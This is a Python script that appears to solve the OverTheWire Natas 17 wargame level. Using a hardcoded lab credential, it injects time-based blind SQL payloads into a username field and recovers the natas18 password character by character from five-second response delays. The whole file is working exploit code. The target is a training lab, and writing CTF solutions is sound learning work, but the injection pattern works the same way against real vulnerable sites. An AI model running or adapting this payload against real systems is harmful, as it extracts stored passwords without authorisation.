import time
import string
import requests
from requests.auth import HTTPBasicAuth
from datetime import timedelta

DEBUG = True

URL = 'http://natas17.natas.labs.overthewire.org'
AUTH = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

def fn(known):
	if len(known) == 33:
		return known[:-1]

	for c in (string.ascii_letters + string.digits):
		attempt = known[:-1] + c + '%'
		username = 'natas18" and if(password like binary "' + attempt + '", sleep(5), null) #'

		if DEBUG:
			print('*** Trying with {}'.format(attempt))

		r = requests.post(URL, auth=AUTH, data={'username': username})
		if r.elapsed >= timedelta(0, 5):
			return fn(attempt)

	return '?'

print(fn('%'))
